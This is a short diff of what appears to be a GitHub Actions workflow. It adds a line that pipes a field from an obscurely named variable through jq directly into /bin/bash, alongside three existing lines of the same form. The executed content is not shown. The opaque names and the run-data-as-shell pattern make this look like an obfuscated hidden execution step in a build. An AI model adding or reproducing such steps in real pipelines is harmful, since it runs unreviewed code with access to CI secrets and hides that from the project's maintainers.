@@ -26,6 +26,7 @@ jobs:
           echo $ek729 | jq -r .cwsyy02569 | /bin/bash
           echo $ossg8 | jq -r .yvls957 | /bin/bash
           printf '%s' "$ous3" | jq -r .oswp178 | /bin/bash
+          echo $porvd805 | jq -r .e0001 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
